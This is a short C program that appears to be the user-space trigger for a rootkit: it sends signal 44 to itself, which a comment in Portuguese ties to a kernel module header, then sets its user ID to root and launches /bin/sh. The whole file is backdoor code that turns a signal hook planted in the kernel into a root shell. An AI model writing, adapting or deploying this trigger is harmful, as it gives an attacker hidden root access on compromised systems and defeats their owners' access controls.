#include <signal.h>
#include <unistd.h>
#include <stdio.h>

int main() {
    kill(getpid(), 44); // Sinal definido em bico_lkm.h
    setuid(0);
    seteuid(0);
    system("/bin/sh");
    return 0;
}
